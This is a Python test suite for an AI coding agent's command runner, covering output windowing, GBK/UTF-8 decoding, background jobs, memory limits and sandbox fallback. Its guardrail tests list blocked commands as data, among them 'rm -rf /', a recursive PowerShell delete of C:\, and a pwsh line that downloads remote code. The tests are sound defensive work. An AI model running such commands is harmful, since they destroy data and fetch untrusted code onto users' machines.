# -*- coding: utf-8 -*-
"""P0：命令执行的预算、输出窗口与后台任务契约。

这里的每条断言都对应一个真实的 vibe coding 断点：命令跑不完、输出被截断到
看不见报错、长任务没有观察入口。护栏类断言（黑名单、降级开关）确保修能力
的同时没有修掉安全边界。
"""
import os
import sys
import tempfile
import time
import unittest
from unittest.mock import patch

import tools
from agent_runtime import process_runner as pr
from agent_runtime import enterprise_sandbox as es


class CommandSpecTests(unittest.TestCase):
    def test_bare_command_is_untouched(self):
        self.assertEqual(tools._parse_command_spec("pytest -q"), ("pytest -q", None, False))

    def test_timeout_line_is_extracted(self):
        self.assertEqual(tools._parse_command_spec("npm run build\ntimeout: 180"),
                         ("npm run build", "180", False))

    def test_background_flag_is_extracted(self):
        self.assertEqual(tools._parse_command_spec("npm test\nbackground: true"),
                         ("npm test", None, True))

    def test_cmd_prefix_is_stripped(self):
        self.assertEqual(tools._parse_command_spec("cmd: pytest -q"), ("pytest -q", None, False))

    def test_first_line_timeout_stays_part_of_command(self):
        command, timeout, _ = tools._parse_command_spec("echo timeout: 5")
        self.assertEqual(command, "echo timeout: 5")
        self.assertIsNone(timeout)

    def test_empty_input(self):
        self.assertEqual(tools._parse_command_spec("   "), ("", None, False))


class BoundedOutputTests(unittest.TestCase):
    def test_window_keeps_head_and_tail_and_marks_omission(self):
        text = "".join(f"line-{i:05d}\n" for i in range(5000))
        windowed = pr.window_text(text)
        self.assertIn("line-00000", windowed)
        self.assertIn("line-04999", windowed)
        self.assertIn("省略", windowed)
        self.assertLess(len(windowed), len(text))

    def test_short_output_is_never_marked(self):
        text = "only a little output"
        self.assertEqual(pr.window_text(text), text)

    def test_multibyte_text_survives_chunked_reads(self):
        with tempfile.TemporaryDirectory() as root:
            result = pr.run_bounded([sys.executable, "-c",
                                     "print('中文输出测试' * 2000)"],
                                    cwd=root, timeout=60)
        self.assertEqual(result["exit_code"], 0)
        self.assertIn("中文输出测试", result["output"])
        self.assertTrue(result["truncated"])

    def test_gbk_output_survives_when_child_gets_no_encoding_hint(self):
        """老工具输出 GBK（`dir`/`ping` 之类）：子进程没有编码提示时，
        必须仍按本地编码解，不能被判成 UTF-8。"""
        with tempfile.TemporaryDirectory() as root:
            env = {k: v for k, v in os.environ.items() if k != "PYTHONIOENCODING"}
            result = pr.run_bounded([sys.executable, "-c", "print('中文输出测试')"],
                                    cwd=root, timeout=60, env=env)
        self.assertEqual(result["exit_code"], 0)
        self.assertIn("中文输出测试", result["output"])
        self.assertNotIn("�", result["output"])

    def test_encoding_decision_survives_a_split_multibyte_char(self):
        """分块正好把一个多字节字符切成两半时，编码判定不能因此翻车。

        整段 `bytes.decode("utf-8")` 会在这里抛错，把 UTF-8 流误判成 GBK；
        判定必须走增量解码器。chunk=1 时每个 GBK 首字节都长得像合法的
        UTF-8 首字节，是最容易误判的一档。
        """
        for encoding in ("utf-8", "gbk"):
            for chunk in (1, 2, 3, 8192):
                raw = "中文输出测试".encode(encoding)
                decoder = pr._new_decoder()
                text = "".join(decoder.decode(raw[i:i + chunk])
                               for i in range(0, len(raw), chunk))
                text += decoder.decode(b"", True)
                self.assertEqual(text, "中文输出测试", f"{encoding} chunk={chunk}")

    def test_large_output_does_not_grow_the_window(self):
        with tempfile.TemporaryDirectory() as root:
            result = pr.run_bounded([sys.executable, "-c",
                                     "[print('line-%05d' % i) for i in range(20000)]"],
                                    cwd=root, timeout=120)
        self.assertEqual(result["exit_code"], 0)
        self.assertGreater(result["total_chars"], 100000)
        self.assertLessEqual(len(result["output"]), pr.HEAD_CHARS + pr.TAIL_CHARS + 200)

    def test_timeout_is_reported_not_swallowed(self):
        with tempfile.TemporaryDirectory() as root:
            result = pr.run_bounded([sys.executable, "-c", "import time; time.sleep(30)"],
                                    cwd=root, timeout=2)
        self.assertTrue(result["timed_out"])
        self.assertFalse(result["ok"])
        self.assertIn("超过", result["error"])

    def test_missing_binary_reports_instead_of_raising(self):
        with tempfile.TemporaryDirectory() as root:
            result = pr.run_bounded(["definitely-not-a-real-binary-xyz"], cwd=root, timeout=5)
        self.assertFalse(result["ok"])
        self.assertTrue(result["error"])

    def test_clamp_timeout_bounds(self):
        self.assertEqual(pr.clamp_timeout("99999"), pr.MAX_TIMEOUT)
        self.assertEqual(pr.clamp_timeout("0"), 1)
        self.assertEqual(pr.clamp_timeout("nonsense"), pr.DEFAULT_TIMEOUT)


class BackgroundJobTests(unittest.TestCase):
    def test_job_streams_incremental_output(self):
        with tempfile.TemporaryDirectory() as root:
            started = pr.start_job([sys.executable, "-c",
                                    "import time,sys\n"
                                    "for i in range(200):\n"
                                    "    print('tick-%03d' % i); sys.stdout.flush(); time.sleep(0.05)"],
                                   cwd=root, timeout=60)
            self.assertTrue(started["ok"])
            job_id = started["job_id"]
            try:
                deadline = time.monotonic() + 10
                while time.monotonic() < deadline:
                    first = pr.job_logs(job_id)
                    if first["total_chars"] > 0:
                        break
                    time.sleep(0.1)
                self.assertIn("tick-", first["logs"])
                second = pr.job_logs(job_id, offset=first["next_offset"])
                self.assertGreaterEqual(second["offset"], first["next_offset"])
            finally:
                pr.job_cancel(job_id)

    def test_cancel_keeps_output_and_marks_state(self):
        with tempfile.TemporaryDirectory() as root:
            started = pr.start_job([sys.executable, "-c",
                                    "import time\nprint('started')\ntime.sleep(60)"],
                                   cwd=root, timeout=120)
            job_id = started["job_id"]
            deadline = time.monotonic() + 10
            while time.monotonic() < deadline and pr.job_logs(job_id)["total_chars"] == 0:
                time.sleep(0.1)
            report = pr.job_cancel(job_id)
            self.assertEqual(report["state"], "cancelled")
            self.assertIn("started", pr.job_logs(job_id)["logs"])

    def test_unknown_job_is_reported(self):
        self.assertFalse(pr.job_logs("does-not-exist")["ok"])
        self.assertFalse(pr.job_cancel("does-not-exist")["ok"])

    def test_listing_without_id_shows_recent_jobs(self):
        self.assertTrue(pr.job_logs("")["ok"])
        self.assertIn("jobs", pr.job_logs(""))

    def test_missing_workdir_is_refused(self):
        self.assertFalse(pr.start_job(["echo"], cwd="/definitely/not/here")["ok"])


class GuardrailTests(unittest.TestCase):
    def test_dependency_install_and_interpreters_now_pass_guardrail(self):
        """「留地板、拆其余」重构：装依赖 / 跑解释器不再是灾难，放开。
        直接调 _cmd_is_blocked 验「过护栏」，不真的执行命令。"""
        for cmd in ("pip install requests", "npm i -g typescript",
                    "python -c \"print(1)\"", "bash build.sh",
                    "powershell ./deploy.ps1", "python build.py"):
            blocked, why = tools._cmd_is_blocked(cmd)
            self.assertFalse(blocked, "%r 不该再被拦（命中 %r）" % (cmd, why))

    def test_shell_wrapped_destruction_still_blocked(self):
        """解释器放开后，被 shell 包裹的破坏性 / RCE 仍须兜住（灾难地板不降）。"""
        for cmd in ('powershell -c "Remove-Item -Recurse -Force C:\\\\"',
                    'bash -c "rm -rf /"',
                    "powershell -command Invoke-Expression",
                    "pwsh -c (New-Object Net.WebClient).DownloadString('http://x')"):
            blocked, why = tools._cmd_is_blocked(cmd)
            self.assertTrue(blocked, "%r 应被兜住（命中 %r）" % (cmd, why))

    def test_blacklist_still_blocks_destructive_commands(self):
        with patch.object(tools, "_get_code_root", return_value=tempfile.gettempdir()):
            self.assertIn("拒绝执行", tools.run_command("rm -rf /"))

    def test_git_write_still_blocked(self):
        with patch.object(tools, "_get_code_root", return_value=tempfile.gettempdir()):
            self.assertIn("拒绝执行", tools.run_command("git commit -m x"))

    def test_empty_command_is_reported(self):
        with patch.object(tools, "_get_code_root", return_value=tempfile.gettempdir()):
            self.assertIn("未提供命令", tools.run_command("   "))

    def test_missing_code_root_is_reported(self):
        with patch.object(tools, "_get_code_root", return_value=None):
            # 工具现在说**可行动的那一半**（缺什么 + 怎么补），不再只说「没配置」。
            self.assertIn("尚未选择项目，无法定位代码库", tools.run_command("echo hi"))

    def test_credentials_are_stripped_from_child_env(self):
        env = pr.clean_environment({"PATH": "x", "MY_API_KEY": "secret", "OK": "1"})
        self.assertNotIn("MY_API_KEY", env)
        self.assertEqual(env["OK"], "1")


class BackgroundMemoryLimitTests(unittest.TestCase):
    """后台任务的内存上限：1 GiB 会掐死真实的全量回归（实测 MemoryError）。"""

    def test_default_is_four_gib(self):
        with patch.dict(os.environ, {"DOCMIND_JOB_MEMORY_MB": ""}):
            self.assertEqual(pr._job_memory_bytes(), 4096 * 1024 * 1024)

    def test_env_override_is_honored(self):
        with patch.dict(os.environ, {"DOCMIND_JOB_MEMORY_MB": "6144"}):
            self.assertEqual(pr._job_memory_bytes(), 6144 * 1024 * 1024)

    def test_invalid_override_falls_back_to_default(self):
        with patch.dict(os.environ, {"DOCMIND_JOB_MEMORY_MB": "not-a-number"}):
            self.assertEqual(pr._job_memory_bytes(), 4096 * 1024 * 1024)


class SandboxFallbackTests(unittest.TestCase):
    def test_staged_commands_never_fall_back(self):
        from agent_runtime.enterprise_sandbox import SandboxUnavailable, stage_execution_scope
        with stage_execution_scope():
            self.assertFalse(es.host_fallback_active())
            with patch.object(es, "run_project_command", side_effect=SandboxUnavailable("no container")):
                with self.assertRaises(SandboxUnavailable):
                    es.run_agent_command(["echo"], project_root=tempfile.gettempdir())

    def test_host_fallback_runs_when_container_is_absent(self):
        with patch.object(es, "execution_mode", return_value="enterprise"), \
             patch.object(es, "container_available", return_value=False), \
             patch.dict(os.environ, {"DOCMIND_SANDBOX_FALLBACK": "host"}), \
             patch.object(es, "run_bounded_host_command",
                          return_value="host-result") as bounded:
            outcome = es.run_agent_command(["echo"], project_root=tempfile.gettempdir())
        self.assertEqual(outcome, "host-result")
        bounded.assert_called_once()

    def test_fallback_off_keeps_fail_closed(self):
        from agent_runtime.enterprise_sandbox import SandboxUnavailable
        with patch.object(es, "execution_mode", return_value="enterprise"), \
             patch.object(es, "container_available", return_value=False), \
             patch.dict(os.environ, {"DOCMIND_SANDBOX_FALLBACK": "off"}), \
             patch.object(es, "run_project_command", side_effect=SandboxUnavailable("no container")):
            with self.assertRaises(SandboxUnavailable):
                es.run_agent_command(["echo"], project_root=tempfile.gettempdir())

    def test_container_preferred_when_available(self):
        with patch.object(es, "execution_mode", return_value="enterprise"), \
             patch.object(es, "container_available", return_value=True), \
             patch.object(es, "run_project_command", return_value="container-result"):
            self.assertEqual(es.run_agent_command(["echo"], project_root=tempfile.gettempdir()),
                             "container-result")
            self.assertFalse(es.host_fallback_active())


class ToolSurfaceTests(unittest.TestCase):
    def test_new_tools_are_registered(self):
        self.assertIn("dev_job_logs", tools.TOOLS)
        self.assertIn("dev_job_cancel", tools.TOOLS)

    def test_bare_job_id_is_accepted(self):
        with tempfile.TemporaryDirectory() as root:
            started = pr.start_job([sys.executable, "-c", "print('bare')"], cwd=root, timeout=30)
            job_id = started["job_id"]
            try:
                time.sleep(0.5)
                self.assertIn(job_id, tools.dev_job_logs(job_id))
                self.assertIn(job_id, tools.dev_job_cancel(job_id))
            finally:
                pr.job_cancel(job_id)

    def test_job_logs_without_id_lists(self):
        self.assertIn("jobs", tools.dev_job_logs(""))

    def test_a_limit_key_does_not_swallow_the_job_id(self):
        """`limit:` 曾经把 job_id 污染成 "abc\\nlimit: 40" → 工具报「任务不存在」。

        而任务明明在跑 —— 那句报错把模型引去「任务没起来」，于是它改用 python_exec
        手搓驱动去「模拟」（实测 2026-10-22：游戏其实已经在跑，模型却以为没跑起来）。
        """
        with tempfile.TemporaryDirectory() as root:
            started = pr.start_job([sys.executable, "-c", "print('bare')"], cwd=root, timeout=30)
            job_id = started["job_id"]
            try:
                time.sleep(0.5)
                out = tools.dev_job_logs("job_id: %s\nlimit: 40" % job_id)
                self.assertIn(job_id, out)
                self.assertNotIn("不存在", out)
            finally:
                pr.job_cancel(job_id)

    def test_a_wrong_job_id_names_the_tasks_that_are_running(self):
        """找不到时必须附上当前在跑的任务 —— 只说「不存在」的话，模型无从自纠。"""
        with tempfile.TemporaryDirectory() as root:
            started = pr.start_job([sys.executable, "-c", "print('bare')"], cwd=root, timeout=30)
            job_id = started["job_id"]
            try:
                time.sleep(0.5)
                out = tools.dev_job_logs("job_id: deadbeef00")
                self.assertIn("不存在", out)
                self.assertIn(job_id, out, "找不到任务时必须报出当前在跑的是哪个")
            finally:
                pr.job_cancel(job_id)


if __name__ == "__main__":
    unittest.main()
